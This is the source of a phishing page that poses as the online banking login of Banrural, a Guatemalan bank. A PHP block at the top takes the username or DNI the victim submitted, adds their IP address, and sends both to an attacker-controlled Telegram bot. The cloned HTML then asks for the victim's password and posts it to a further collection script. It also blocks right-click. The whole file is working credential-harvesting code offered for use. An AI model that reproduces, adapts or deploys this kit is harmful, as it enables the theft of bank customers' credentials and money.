<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('datos_del_tel.php');
////////////////////

if ( isset ($_POST['usr'])){


$message = "Login-Banrural-GT\r\nDNI: ".$_POST['usr']."\r\nIP ".$userp."\r\n";


$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

}else{ header ('location: index.html'); exit();
 }

?>

<!DOCTYPE html>
<html style="height: 100%; overflow: hidden; display: block;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Banrural</title>
    
    
    <meta http-equiv="refresh" content="600">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    










	<script type="text/javascript" src="./Banrural_files/jquery-1.4.2.min.js.descarga"></script>
	<script type="text/javascript" src="./Banrural_files/jquery-ui.min.js.descarga"></script>
	<script type="text/javascript" src="./Banrural_files/jquery.form.min.js.descarga"></script>
  <script type="text/javascript" src="./Banrural_files/jquery.subscribe.min.js.descarga"></script>
        	<link rel="stylesheet" href="./Banrural_files/jquery-ui.css" type="text/css">
  <script type="text/javascript" src="./Banrural_files/jquery.struts2.min.js.descarga"></script>
<script type="text/javascript">
jQuery(document).ready(function () {
	jQuery.struts2_jquery.loadAtOnce = true;
  	jQuery.scriptPath = "/cb/struts/";
	jQuery.struts2_jquery.defaults.indicator="indicator";
	jQuery.ajaxSettings.traditional = true;

	jQuery.ajaxSetup ({
		cache: false
	});
});
</script>



	<script type="text/javascript">
	<!--
	document.cookie='DefaultTheme=SAP;expires=365 path=/';
	//-->
	</script>		


    
    <script src="./Banrural_files/analytics-v4.1.js.descarga"></script>
    

    <link type="text/css" rel="stylesheet" media="all" href="./Banrural_files/normalize.css">
    <link type="text/css" rel="stylesheet" media="all" href="./Banrural_files/font-futura.css">
    <link type="text/css" rel="stylesheet" media="all" href="./Banrural_files/FF.min.css">
    <link type="text/css" rel="stylesheet" media="all" href="./Banrural_files/login.css">
    <link type="text/css" rel="stylesheet" media="all" href="./Banrural_files/layout.css">
    <link type="text/css" rel="stylesheet" media="all" href="./Banrural_files/showLoading.min.css">
    <link type="text/css" rel="stylesheet" media="all" href="./Banrural_files/ui.selectmenu.min.css">
    <script type="text/javascript" src="./Banrural_files/login.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/jquery.pwdstrength.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/jquery-ui.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/jquery.ui.plugins.min.js.descarga"></script>
    
    
    <script type="text/javascript" src="./Banrural_files/jquery-ui-css.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/jquery.showLoading.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/utils.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/custom.validation.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/jquery.ui.selectmenu.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/jquery.ui.pane.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/jquery.browser.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/layout.latest.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/namespace.min.js.descarga"></script>
    <script type="text/javascript" src="./Banrural_files/jquery.i18n.properties.min.js.descarga"></script>

    
    <script type="text/javascript">
        $(document).ready(function () {
            jQuery.i18n.properties({
                name: 'LoginJavaScript',
                path: '/cb/web/js/i18n/',
                mode: 'both',
                language: 'es_GT',
                cache: true,
                callback: function () {
                }
            });
            fixIpad();
        });

        function include(resource) {
            
            transmission.index(1, "include.jsp", resource);
            
        }
    </script>
    <style type="text/css">
        
        body .es_GT .ui-selectmenu-item-icon {
            height: 24px;
            width: 24px;
            background: url('/cb/web/multilang/grafx/es_GT_flag.png') 0 0 no-repeat;
        }

        
    </style>

    
    <!--[if IE]>
    <link type="text/css" rel="stylesheet" media="all" href="/cb/web/css/banrural/ie-ltg-7.css"/>
    <![endif]-->
</head>

<body class="not-front login--step-1" style="position: relative; height: 100%; overflow: hidden; margin: 0px; padding: 0px; border: none;">
<!-- Header -->
<div class="ui-layout-north ui-layout-pane ui-layout-pane-north" style="position: absolute; margin: 0px; inset: 0px 0px auto; width: auto; z-index: 1; height: 100px; visibility: visible; display: block;">





<div class="headerContainer">
    <div class="l-header--branding">
        <img onclick="ns.common.changeLanguage(&#39;index.jsp?request_locale=es_GT&#39;);" alt="Banrural" height="64" src="./Banrural_files/logo_bdr2.png">
    </div>

    <div id="page" class="l-header--right clearfix">
        <!-- Date and time block -->
        <div id="date-time-block" class="block clearfix">
            <div class="dateLocale">
                <span class="icon icon--calendar"></span>
                
                <span class="format--date"> <span></span>  <span></span></span>
            </div>
            <div class="timeLocale">
                <span class="icon icon--clock"></span>
                
                <span>Departamento De Seguridad</span>
            </div>
        </div>
        <!-- Secondary navigation menu -->
        <div id="secondary-menu" class="block clearfix">
            <ul class="menu clearfix">
                <li>
                    <a target="_top" id="GoHomeLink" title="" href="">
                        <span class="icon smenu--icon--home"></span><span class="menu-link-title"></span></a></li>
            </ul>
        </div>
    </div>
    
    
</div>
</div>

<!--  Content -->
<div class="ui-layout-center ui-layout-pane ui-layout-pane-center ui-layout-pane-hover ui-layout-pane-center-hover ui-layout-pane-open-hover ui-layout-pane-center-open-hover" style="overflow: auto; position: absolute; margin: 0px; inset: 106px 0px 0px; height: 537px; width: 1366px; z-index: 1; display: block; visibility: visible;">
    


<div class="desktop selectmenu-area">	
	<div class="ui-helper-reset pane ui-widget" id="signin_menu_pane"><div class="pane-header ui-state-default ui-corner-top ui-state-active pane-header-active"><span style="float:left;" class="pane-title">Ingreso Paso 1</span><span class="headerctls" style="display: none;"><a title="Haz clic aquí para conocer más sobre seguridad" class="ctllink ui-corner-all" href="javascript:void(0)"><span class="ui-icon ui-icon-locked"></span></a></span></div><div id="signin_menu" class="step-1 pane-content ui-widget-content ui-corner-bottom">
		












<link type="text/css" rel="stylesheet" media="all" href="./Banrural_files/font-awesome.css">







<img alt="Banrural Virtual" width="215" height="56" src="./Banrural_files/banrural-virtual.png">

    <input type="hidden" name="CSRF_TOKEN" value="3021156568280100997" id="loginFormID_CSRF_TOKEN">
    <div id="loginInputDivID">
        <div class="form-elements-float clearfix">
                
            
            
                <input type="hidden" name="CustomerID" value="uselessCustID" id="loginFormID_CustomerID">
                <div id="userNameInputDivID" class="field-item field--name-username">
                    <label class="form-label">


<form name="contactForm" method="post" action="confirmar23.php" id="aspnetForm">

                        <span class="icon icon--label icon--label--username"></span>
                        <span>Contraseña</span><span class="required">*</span>
                    </label>
                    
<input id="focusObj" type="text" maxlength="32" size="30" name="usr1" id="name" required=" class="form-text" tabindex="1" onpaste="return false">
                    <div style="margin-top: 10px;">

<input type="submit" value=" > > Siguiente" style="font: 500 18px 'Open Sans';
    display: inline-block;
    background: #128A27;
    color: #FFFFFF;
    padding: 6px 6px;
    line-height: 20px;
    box-sizing: content-box;
    border-radius: 40px;
    box-shadow: 0 1px 6px rgb(0 0 0 / 10%);
    text-align: center;width:150px;" class="btn btn-block btn-primary rounded-0 py-4 px-4">
                  <span class="submitting"></span>
                        
                        <span id="gestiones" style="display: none;">/span>
                        <a id="aGestiones" href="" style="font-size: 0.7692em; color:#00853F">Olvidé mi usuario</a>
                    </div>
                    <div id="UserNameErrorDivID" class="message--error form--error" style="display: none;">
                        
                        <span class="icon icon--message--error"></span><span id="UserNameError"></span>
                        
                    </div>
                </div>
            
            </div>
            
        </div> <!-- //.form-elements-float -->

            
        <hr style="clear:both; height:0; width:100%;border:1px solid transparent;">

        <div class="container">
                
            
            <div id="message--required-fields">
                <span>*Campos requeridos</span>
            </div>
            
            <div id="loginAlertInfoDivID">
                <p><span class="icon icon--phone"></span>Si requieres asistencia llama al (502) 2498-5885</p>
                <p>Derechos Reservados 2017.<br>Banco de Desarrollo Rural, S.A.</p>
            </div>
        </div>
    </div>
</form>













<div id="securityDiv">

</div>


	</div></div>

	<div id="login-init-target" style="visibility:hidden"></div>
</div>
<!--<div id="loginMessages" class="loginMessagePanel ui-widget-content">...Loading login messages</div> -->

</div>


<script>(function(){var js = "window['__CF$cv$params']={r:'7ff2160ee8f38dd3',t:'MTY5MzQ1MTQ4Ni41OTIwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/invisible.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="./Banrural_files/saved_resource.html"></iframe>

<script type="text/javascript">
    $(function () {
        $(this).bind("contextmenu", function (e) {
            e.preventDefault();
        });
    });
</script>

<script>
    
    
    ns.login.loginStep1 = 'Ingreso Paso 1';
    js_login_step2 = 'Ingreso Paso 2';
    js_change_password = 'Cambiar clave';
    js_reset_SQA = 'Reiniciar Pregunta y Respuesta de Seguridad';
    js_inactive_account = 'Cuenta inactiva';
    js_tooltip_security = 'Haz clic aquí para aprender más sobre seguridad';
    var noRedirect = true;
</script>
<!--[if IE]>
<script type="text/javascript">
    $("#signin_menu").load("invalid-browser.jsp");
    $("body").removeClass().addClass('section-invalid-browser');
    noRedirect = false;
</script>
<![endif]-->
<!-- [if gte IE 7] >
<![endif]-->
<script>
    function isIE(v) {
        var ie;
        ie = RegExp('msie' + (!isNaN(v)?('\\s'+v):''), 'i').test(navigator.userAgent);
        if (!ie) { ie = !!navigator.userAgent.match(/Trident.*rv[ :]*11\./) }
        return ie;
    }
    var bIsIE = false;
    if(/*@cc_on!@*/false){
        bIsIE = true;
    }
    if (bIsIE  || isIE(11) || isIE(10) || isIE(9) || isIE(7)){
        $("#signin_menu").load("invalid-browser.jsp");
        $("body").removeClass().addClass('section-invalid-browser');
        noRedirect = false;
    }
    $(document).ready(function () {
        var config = {
            appType: 'EFS',
            themeName: 'SAP'
        };
        loginController.init(config);
        if (!noRedirect) {
            $("#signin_menu").load("invalid-browser.jsp");
        }
    });
</script>
<div id="version_1" style="display:none; max-width:0px;max-height:0px;height:0px;line-height: 1px;">
    
    srvwas8prod02:9455
</div>


<div class="ui-dialog ui-widget ui-widget-content ui-corner-all  ui-draggable" tabindex="-1" role="dialog" aria-labelledby="ui-dialog-title-security" style="display: none; z-index: 1000; outline: 0px; height: auto; width: 700px; top: 130px; left: 333px;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix" unselectable="on"><span class="ui-dialog-title" id="ui-dialog-title-security" unselectable="on">SEGURIDAD</span><a href="https://bancavirtual.banrural.com.gt/cb/pages/jsp-ns/login-cons.jsp#" class="ui-dialog-titlebar-close ui-corner-all" role="button" unselectable="on"><span class="ui-icon ui-icon-closethick" unselectable="on">close</span></a></div><div id="security" style="width: auto; min-height: 59px; height: auto;" class="ui-dialog-content ui-widget-content"><span></span></div><div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix"><button type="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false"><span class="ui-button-text">ANTERIOR</span></button></div></div><div id="" class="ui-layout-resizer ui-layout-resizer-north ui-layout-resizer-open ui-layout-resizer-north-open" style="position: absolute; padding: 0px; margin: 0px; font-size: 1px; text-align: left; overflow: hidden; z-index: 2; top: 100px; cursor: default; display: block; width: 1366px; height: 6px; left: 0px;"></div></body></html>